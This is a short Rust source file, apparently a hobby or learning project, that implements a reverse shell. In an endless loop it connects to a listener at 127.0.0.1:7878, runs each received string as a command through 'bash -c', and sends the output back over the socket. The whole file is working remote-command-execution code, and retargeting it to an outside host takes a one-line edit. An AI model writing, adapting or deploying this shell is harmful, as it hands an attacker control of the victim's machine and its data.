use std::io::prelude::*;
use std::net::TcpStream;
use std::process::Command;
use std::str::Bytes;

fn main() {

    let mut stream: TcpStream;

    while 1 == 1 
    {
        stream = TcpStream::connect("127.0.0.1:7878").unwrap();

        handle_connection(stream);
    }
}

fn handle_connection(mut connection: TcpStream)
{
    let mut buffer: [u8; 1024] = [0; 1024];

    connection.read(&mut buffer).unwrap();
    //println!("{}:{}", connection.peer_addr().unwrap(), String::from_utf8_lossy(&buffer[..]));
    let mut command: String = String::from_utf8_lossy(&buffer[..]).to_string();
    command = command.trim_matches(char::from(0)).to_string();
    let mut bash = Command::new("bash");
    bash.args(["-c", &command]);

    match bash.output()
    {
        Ok(o) => {
            //println!("Output: {}", String::from_utf8_lossy(&o.stdout));
            send_output(connection, String::from_utf8_lossy(&o.stdout).to_string());
        },
        Err(e) => {
            println!("There was an error: {}", e);
        },
    }
}

fn send_output(mut connection: TcpStream, output: String)
{
    let mut buffer: [u8; 1024] = [0; 1024];

    let mess_bytes: Bytes = output.bytes();

    let mut nice_vec: Vec<u8> = Vec::new(); 

    for x in mess_bytes
    {
        nice_vec.push(x);
    }

    for x in 0..nice_vec.len()
    {
        buffer[x] = nice_vec[x];
    }
    
    connection.write(&mut buffer).unwrap();
}
